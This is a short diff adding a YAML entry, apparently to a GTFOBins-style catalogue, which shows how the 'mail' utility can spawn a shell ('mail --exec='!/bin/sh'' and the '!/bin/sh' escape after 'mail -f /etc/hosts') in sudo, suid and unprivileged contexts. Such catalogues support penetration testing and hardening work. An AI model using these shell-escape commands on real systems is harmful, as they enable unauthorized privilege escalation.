@@ -1,0 +1,21 @@
+---
+functions:
+  shell:
+  - code: |-
+      mail --exec='!/bin/sh'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    version: |-
+      GNU
+  - code: |-
+      mail -f /etc/hosts
+      !/bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
